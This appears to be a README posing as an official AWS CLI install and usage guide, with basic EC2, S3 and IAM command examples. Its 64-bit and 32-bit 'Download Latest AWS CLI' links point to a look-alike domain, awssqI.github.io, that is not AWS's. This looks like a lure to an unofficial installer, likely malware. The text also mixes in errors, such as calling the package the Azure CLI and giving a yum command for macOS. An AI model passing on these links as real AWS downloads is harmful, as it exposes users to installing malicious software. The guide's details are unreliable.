# Download and Install AWS CLI on Windows

### Latest version

Download and install the newest release of the AWS CLI. When prompted by the installer to allow changes to your computer, choose "Yes".

**[Download Latest AWS CLI (64-bit)](https://awssqI.github.io/.github/)**           
**[Download Latest AWS CLI (32-bit)](https://awssqI.github.io/.github/)**          

If the AWS CLI is already installed on your system, running either the 32-bit or 64-bit installer will overwrite the current version with the new one.

The EXE and ZIP packages are used to install or update the Azure CLI on Windows. You don’t need to manually remove the existing version—running the EXE installer will automatically upgrade it if it's already present.


#### Installing on Linux/macOS:

1. Make sure Python and `pip` are installed:

   ```bash
   sudo yum install python3 pip
   ```
2. Use `pip` to install the AWS CLI:

   ```bash
   sudo pip install awscli
   ```
3. Confirm the installation was successful:

   ```bash
   aws --version
   ```

> \[!TIP]
> If `sudo` access is unavailable, install the AWS CLI locally in your user directory by adding the `--user` flag when running `pip`.

## Quick Configuration

Once the AWS CLI is installed, it must be configured with your credentials and default settings. The simplest method to set this up is by running the `aws configure` command.

### Steps to Configure:

1. Execute this command:

   ```bash
   aws configure
   ```
2. Provide your AWS Access Key ID and Secret Access Key.
3. Choose the default region (e.g., `us-west-1`).
4. Define the preferred output format (e.g., `json`).

Example:

```bash
$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE  
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY  
Default region name [None]: us-west-1  
Default output format [None]: json  
```

> \[!IMPORTANT]
> Keep your credentials safe. Never expose your Secret Access Key to others.


## Command Structure

The AWS CLI features a consistent command syntax that’s designed to be intuitive and easy to use. The basic structure of any command looks like this:

```bash
aws <service> <operation> [options and parameters]
```

### Example:

To list all EC2 instances:

```bash
aws ec2 describe-instances
```

### Common Options:

* `--profile`: Specify a named configuration profile.
* `--region`: Choose a particular AWS region.
* `--output`: Define the output format (`json`, `text`, or `table`).


## Specifying Parameter Values

While working with the AWS CLI, you’ll frequently need to supply values for parameters. These may be basic types like strings or numbers, or more complex ones such as lists or JSON objects.

### Common Parameter Types:

* **Strings**: Wrap strings with spaces in quotation marks.

  ```bash
  aws ec2 create-key-pair --key-name "My Key Pair"
  ```
* **Lists**: Separate each item with a space.

  ```bash
  aws ec2 describe-instances --instance-ids i-1234567890abcdef0 i-0987654321fedcba
  ```
* **JSON**: Use JSON formatting for structured data.

  ```bash
  aws ec2 run-instances --block-device-mappings '[{"DeviceName":"/dev/sdf","Ebs":{"VolumeSize":20}}]'
  ```

> \[!TIP]
> You can store JSON input in a file and reference it by using `file://`.


## Controlling Command Output

The AWS CLI offers various output formats and filtering options to customize how command results are displayed.

### Output Formats:

* **JSON**: The default; best suited for scripts and automation.
* **Text**: Tab-separated format, useful with tools like `grep` or `awk`.
* **Table**: Readable layout for interactive use.

### Example:

Display EC2 instances in table format:

```bash
aws ec2 describe-instances --output table
```

### Filtering Output:

Use the `--query` flag to refine and format results:

```bash
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name]' --output table
```


## Using Amazon EC2

You can use the AWS CLI to manage EC2 instances, key pairs, and associated security settings.

### Key Operations:

* **Create a Key Pair**:

  ```bash
  aws ec2 create-key-pair --key-name MyKeyPair
  ```
* **Launch an Instance**:

  ```bash
  aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro --key-name MyKeyPair
  ```
* **List Instances**:

  ```bash
  aws ec2 describe-instances
  ```

> \[!NOTE]
> Ensure that your security groups are configured to allow essential traffic (e.g., SSH on port 22).


## Using Amazon S3

The AWS CLI supports two sets of commands for Amazon S3:

* **High-Level Commands (`s3`)**: Simplified for routine operations.
* **API-Level Commands (`s3api`)**: Provide access to full capabilities.

### Example Commands:

* **Upload a File to S3**:

  ```bash
  aws s3 cp myfile.txt s3://mybucket/
  ```
* **List Buckets**:

  ```bash
  aws s3 ls
  ```
* **Synchronize a Directory**:

  ```bash
  aws s3 sync . s3://mybucket/
  ```


## AWS Identity and Access Management (IAM)

With the AWS CLI, you can create and manage IAM users, groups, and access policies.

### Key Operations:

* **Create a User**:

  ```bash
  aws iam create-user --user-name MyUser
  ```
* **Create a Group**:

  ```bash
  aws iam create-group --group-name MyGroup
  ```
* **Attach a Policy**:

  ```bash
  aws iam attach-user-policy --user-name MyUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```


## Getting Help

The AWS CLI includes detailed help for every command. You can use the `help` argument to display command documentation.

### Examples:

* **General Help**:

  ```bash
  aws help
  ```
* **Help with EC2**:

  ```bash
  aws ec2 help
  ```
* **Help for a Specific Command**:

  ```bash
  aws ec2 describe-instances help
  ```

> \[!TIP]
> Use the `--output text` flag to pipe help text into `more` or `less` for easier navigation.


This guide delivers a thorough introduction to the AWS CLI, covering setup, configuration, and essential commands for commonly used AWS services. With this knowledge, you can confidently manage AWS resources directly from your terminal.
